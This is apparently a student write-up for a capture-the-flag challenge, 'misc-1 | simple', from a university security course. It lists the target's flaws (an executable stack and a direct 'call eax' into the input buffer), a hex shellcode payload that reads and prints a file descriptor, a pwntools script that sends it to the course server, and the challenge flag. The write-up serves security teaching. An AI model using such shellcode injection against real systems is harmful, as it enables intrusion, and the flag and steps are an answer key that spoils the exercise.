misc-1 | simple
===========================

Flag: `6447{916709a2-490a-4ee1-b631-62452673a148}`

General overview of problems faced
-------------------------------------
Learned how to write and convert shellcode using pwntools

List of vulnerabilities
--------------------
1. The stack is executable
2. The program executes the code in your buffer by loading the buffer into eax and executing `call eax` which allows the user to input malicious code

Steps to exploit
------------------
1. Generate assembly code to read from file handler 1000 into esp and read 42 bytes of text
2. Generate assembly code to write to STDOUT (fh = 1) and write 42 bytes.
3. Convert the assembly code to hex. A valid payload is "\x31\xdb\x66\xbb\xe8\x03\x89\xe1\x6a\x2a\x5a\x6a\x03\x58\xcd\x80\x6a\x01\x5b\x89\xe1\x6a\x2a\x5a\x6a\x04\x58\xcd\x80"
4. Send the payload and receive the flag

Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

# Flag: 6447{916709a2-490a-4ee1-b631-62452673a148}

from pwn import *

context.arch = 'i386'

r = remote("misc.6447.sec.edu.au", 8005)

payload = shellcraft.read(1000, 'esp', 42)
payload += shellcraft.write(1, 'esp', 42)

asm_payload = asm(payload)
r.sendline(asm_payload)

print "Flag:", r.recvrepeat(0.2).split()[-1]
```
